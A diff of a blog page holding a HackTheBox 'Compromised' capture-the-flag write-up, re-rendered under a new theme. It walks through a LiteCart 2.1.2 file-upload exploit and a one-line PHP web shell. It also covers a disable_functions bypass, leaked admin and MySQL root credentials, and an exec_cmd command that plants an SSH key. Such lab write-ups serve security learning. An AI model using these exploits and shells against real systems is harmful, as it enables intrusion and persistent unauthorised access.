@@ -1,6 +1,124 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Compromised Writeup · Ikonw</title><meta name="description" content="HTB Compromised Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
-</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Compromised Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a><a href="/tags/reverse/" class="tag-title">#reverse</a><a href="/tags/mysql-exec-cmd/" class="tag-title">#mysql exec_cmd</a></div><div class="post-info">Sep 17, 2020</div><div class="post-content"><p><img src="/images/HTB-Compromised-Hard/image-20200917153421555.png" alt="image-20200917153421555"></p>
-<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207</span><br><span class="line">Nmap scan report for 10.10.10.207</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)</span><br><span class="line">|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)</span><br><span class="line">|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-title: Legitimate Rubber Ducks | Online Store</span><br><span class="line">|_Requested resource was http://10.10.10.207/shop/en/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  HTB Compromised Writeup |   Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			HTB Compromised Writeup
+		</p>
+		<div class="info">	
+			<time>
+				Sep 17, 2020
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">6593
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+
+			
+					<p><img src="/images/HTB-Compromised-Hard/image-20200917153421555.png" alt="image-20200917153421555"></p>
+<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan:"></a>Nmap Scan:</h3><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Thu Sep 17 12:32:35 2020 as: nmap -Pn -sCV -p22,80 -oN nmap/Full_10.10.10.207.nmap 10.10.10.207</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span></span><br><span class="line">Host is up (<span class="number">0.13</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0<span class="number">.3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>e:da:<span class="number">5</span>c:<span class="number">8</span>e:<span class="number">8</span>e:fb:<span class="number">8</span>e:<span class="number">75</span>:<span class="number">27</span>:<span class="number">4</span><span class="keyword">a</span>:b9:<span class="number">2</span><span class="keyword">a</span>:<span class="number">59</span>:cd:<span class="number">4</span>b:cb (RSA)</span><br><span class="line">|   <span class="number">256</span> d5:c5:b3:<span class="number">0</span>d:c8:b6:<span class="number">69</span>:e4:fb:<span class="number">13</span>:a3:<span class="number">81</span>:<span class="number">4</span><span class="keyword">a</span>:<span class="number">15</span>:<span class="number">16</span>:d2 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">35</span>:<span class="number">6</span><span class="keyword">a</span>:ee:af:dc:f8:<span class="number">5</span>e:<span class="number">67</span>:<span class="number">0</span>d:bb:f3:ab:<span class="number">18</span>:<span class="number">64</span>:<span class="number">47</span>:<span class="number">90</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span>    Apache httpd <span class="number">2.4</span><span class="number">.29</span> ((Ubuntu))</span><br><span class="line">|<span class="title">_http-server-header</span>: Apache/<span class="number">2.4</span><span class="number">.29</span> (Ubuntu)</span><br><span class="line">| <span class="keyword">http</span>-title: Legitimate Rubber Ducks | Online Store</span><br><span class="line">|_Requested resource was <span class="keyword">http</span>://<span class="number">10.10</span><span class="number">.10</span><span class="number">.207</span>/shop/en/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Thu Sep 17 12:32:47 2020 -- 1 IP address (1 host up) scanned in 12.01 seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>Port 80 webserver was a online store</p>
 <p>As usual, launch gobuster enumerate potential directories</p>
@@ -8,10 +126,10 @@
 <p>Found a backup directory, I believe it’s the source code for the web</p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200917153509156.png" alt="image-20200917153509156"></p>
 <p>search for the keyword <code>username</code> to look for potential plaintext username or hard coded password </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -R &#x27;username|password&#x27; |grep -v &#x27;jquery&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> -R <span class="string">&#x27;username|password&#x27;</span> |<span class="keyword">grep</span> -v <span class="string">&#x27;jquery&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>and we found login.php have suspicious <code>file_put_contents</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(user::<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) notices::<span class="title function_ invoke__">add</span>(<span class="string">&#x27;notice&#x27;</span>, language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;text_already_logged_in&#x27;</span>, <span class="string">&#x27;You are already logged in&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">//file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#x27;username&#x27;] . &quot; Passwd: &quot; . $_POST[&#x27;password&#x27;]);</span></span><br><span class="line">  user::<span class="title function_ invoke__">login</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$redirect_url</span>, <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>] : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(user::<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) notices::<span class="title function_ invoke__">add</span>(<span class="string">&#x27;notice&#x27;</span>, language::<span class="title function_ invoke__">translate</span>(<span class="string">&#x27;text_already_logged_in&#x27;</span>, <span class="string">&#x27;You are already logged in&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">  <span class="comment">//file_put_contents(&quot;./.log2301c9430d8593ae.txt&quot;, &quot;User: &quot; . $_POST[&#x27;username&#x27;] . &quot; Passwd: &quot; . $_POST[&#x27;password&#x27;]);</span></span><br><span class="line">  user::<span class="title function_ invoke__">login</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$redirect_url</span>, <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;remember_me&#x27;</span>] : <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>Navigate to the location and we got the user and passwd</p>
 <p><code>admin:theNextGenSt0r3!~</code></p>
@@ -19,37 +137,37 @@
 <p>Login to the authentication portal, we got the LiteCart version number</p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200917153639177.png" alt="image-20200917153639177"></p>
 <p>And yeah, we got the poc </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                                           |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">LiteCart 2.1.2 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/45267.py</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br></pre></td></tr></table></figure>
+<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> <span class="comment">Exploit Title                                                                                                                                                                                           |  Path</span></span><br><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"><span class="comment">LiteCart 2</span><span class="string">.</span><span class="comment">1</span><span class="string">.</span><span class="comment">2</span> <span class="literal">-</span> <span class="comment">Arbitrary File Upload                                                                                                                                                                   | php/webapps/45267</span><span class="string">.</span><span class="comment">py</span></span><br><span class="line"><span class="literal">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br></pre></td></tr></table></figure>
 
 <p>The initial exploit was not able to work, it was able to create a php file, but <code>system</code> seems disable. Tried different shell execution function like <code>shell_exec</code> didnt work either. </p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] ) ) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span> ); &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] ) ) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span> ); &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>Instead of continuing try for luck, <code>phpinfo()</code> will give us what function is disabled. And we got tons of function being disabled</p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200918141630991.png" alt="image-20200918141630991"></p>
 <p>After research, found a php script able to bypass the restriction</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">PHP 7.0-7.3 disable_functions bypass</a></p>
 <p>Modified the script for the pwn function</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
 <p>Next modify the litecart poc</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;exploit.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (rand + <span class="string">&quot;.php&quot;</span>,data, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;exploit.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">files = &#123;</span><br><span class="line">        <span class="string">&#x27;vqmod&#x27;</span>: (rand + <span class="string">&quot;.php&quot;</span>,data, <span class="string">&quot;application/xml&quot;</span>),</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>:one,</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:(<span class="literal">None</span>,<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>and we manage to gain <code>rce</code></p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200918142412690.png" alt="image-20200918142412690"></p>
 <p>After trying hard to I found it seems www-data is very restricted, only very few command able to execute. I didnt manage to get a proper reverse shell.</p>
 <p>After long enumeration</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash</span><br><span class="line">red:x:1001:1001::/home/red:/bin/false</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash</span><br><span class="line">red:x:1001:1001::/home/red:/bin/false</span><br></pre></td></tr></table></figure>
 
 <p>I actually found that, mysql is a user. Went back to the initial foothold, I manage to find the mysql root username and password </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Database</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TYPE&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;changethis&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_DATABASE&#x27;</span>, <span class="string">&#x27;ecom&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;lc_&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_CONNECTION_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PERSISTENT_CONNECTIONS&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> Database</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TYPE&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_SERVER&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;changethis&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_DATABASE&#x27;</span>, <span class="string">&#x27;ecom&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;lc_&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_CONNECTION_CHARSET&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  <span class="keyword">define</span>(<span class="string">&#x27;DB_PERSISTENT_CONNECTIONS&#x27;</span>, <span class="string">&#x27;false&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>and we got the creds for mysql <code>root:changethis</code>. We can launch mysql client, execute commands to write our ssh public key to authorized_keys</p>
 <p><img src="/images/HTB-Compromised-Hard/image-20200918144023178.png" alt="image-20200918144023178"></p>
 <p>yeah, we manage to get code execution for user <code>mysql</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -pchangethis -e <span class="string">&quot;SELECT exec_cmd(&#x27;echo sshxxxxxxxxxxx&#x27; &gt; /var/lib/mysql/.ssh/authorized_keys)&quot;</span></span><br></pre></td></tr></table></figure>
